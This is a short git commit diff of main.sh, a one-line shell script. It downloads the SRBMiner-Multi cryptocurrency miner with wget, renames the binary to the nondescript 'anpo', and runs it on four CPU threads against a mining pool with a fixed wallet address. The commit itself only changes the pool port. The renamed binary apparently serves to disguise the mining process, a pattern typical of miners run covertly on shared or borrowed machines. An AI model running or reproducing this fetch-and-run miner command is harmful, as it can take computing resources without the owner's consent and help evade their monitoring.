4f00b782e3b35d878562a6fbf4257d4eb6e3f5ae
sabri fuadi <sabrif0610@gmail.com>
2023-03-10 21:51:50 +0000

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,2 +1,2 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI anpo && ./anpo --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4445 --wallet 007DE31E4FD8213FBCE3586A3D2260C962142BBC605BB41C41.1 -t 4
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz && tar xf SRBMiner-Multi-2-1-0-Linux.tar.xz && cd SRBMiner-Multi-2-1-0 && mv SRBMiner-MULTI anpo && ./anpo --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 007DE31E4FD8213FBCE3586A3D2260C962142BBC605BB41C41.1 -t 4
 
